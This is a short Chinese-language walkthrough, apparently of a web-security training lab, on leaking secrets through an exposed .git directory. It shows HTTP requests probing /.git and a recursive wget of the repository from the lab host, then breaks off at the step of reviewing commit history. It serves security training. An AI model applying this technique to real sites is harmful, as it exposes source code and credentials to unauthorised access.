# 实验室：版本控制历史中的信息泄露

本实验室通过其版本控制历史泄露了敏感信息。要解决本实验，请获取 `administrator` 用户的密码，然后登录并删除用户 `carlos`。

## 步骤

探测
- 访问首页
    ```http
    GET / HTTP/1.1
    Host: id.web-security-academy.net
    ```

- 尝试访问版本控制
    ```http
    GET /.git HTTP/2
    Host: id.web-security-academy.net
    ```

    - 响应为 .git 目录

解析 .git 信息
- 下载 .git 目录
    ```sh
    wget -r https://id.web-security-academy.net/.git/
    ```
    - 使用 wget 递归下载目录 

- 进入 .git 目录，查看提交记录
